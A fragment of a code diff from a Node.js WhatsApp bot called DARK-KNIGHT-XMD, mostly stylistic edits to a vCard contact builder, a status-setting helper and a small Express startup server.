-          global.OwnerName || 'Owner'
-        }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
-          global.email || ''
-        }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
-          global.github || ''
-        }/DARK-KNIGHT-XMD\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
-          global.location || ''
-        };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
-      });
+        )}\nFN:${global.OwnerName
+          }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email
+          }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github
+          }/DARK-KNIGHT-XMD\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location
+          };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
+      })
     }
     conn.sendMessage(
       jid,
@@ -639,8 +705,8 @@ async function connectToWA() {
         ...opts,
       },
       { quoted },
-    );
-  };
+    )
+  }
 
   conn.setStatus = status => {
     conn.query({
@@ -657,17 +723,19 @@ async function connectToWA() {
           content: Buffer.from(status, 'utf-8'),
         },
       ],
-    });
-    return status;
-  };
-  conn.serializeM = mek => sms(conn, mek, store);
+    })
+    return status
+  }
+
+  conn.serializeM = mek => sms(conn, mek, store)
 }
 
 app.get("/", (req, res) => {
-  res.send("DARK-KNIGHT-XMD IS STARTED ✅");
-});
-app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
+  res.send("DARK-KNIGHT-XMD IS  STARTED ✅")
+})
+
+app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`))
 
 setTimeout(() => {
   connectToWA()
-}, 10000);
+}, 10000)
